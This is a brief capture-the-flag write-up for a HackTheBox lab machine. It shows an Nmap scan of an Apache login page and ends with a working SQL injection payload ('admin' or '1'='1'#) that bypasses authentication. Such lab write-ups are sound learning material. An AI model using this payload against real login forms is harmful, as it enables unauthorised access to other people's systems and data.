## Reconnaissance

Kicking off with a simple Nmap scan...

__Nmap Scan__
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/three]
└─$ sudo nmap -sC -sV -oN nmap.txt 10.129.92.59
Nmap scan report for 10.129.92.59
Host is up (0.017s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 17 19:49:07 2022 -- 1 IP address (1 host up) scanned in 18.30 seconds
```


On visiting the web-site I see a login. I tried common passwords (admmin:admin, admin:password, etc) but it didn't work.

So, I guess, I'll have to use some kind of injection technique to bypass the login page.

Firstly, i tried SQL Injection and it gave me an `SQL` error, so I was pretty sure that the authentication form is vulnerable to SQL injection. So I tried various SQL paylaods to bypass theh authentication page and the one that finally worked was
```
username: admin' or '1'='1'#
password: <anything>
```

Once, you're logged in, you get the flag to complete the exercise.
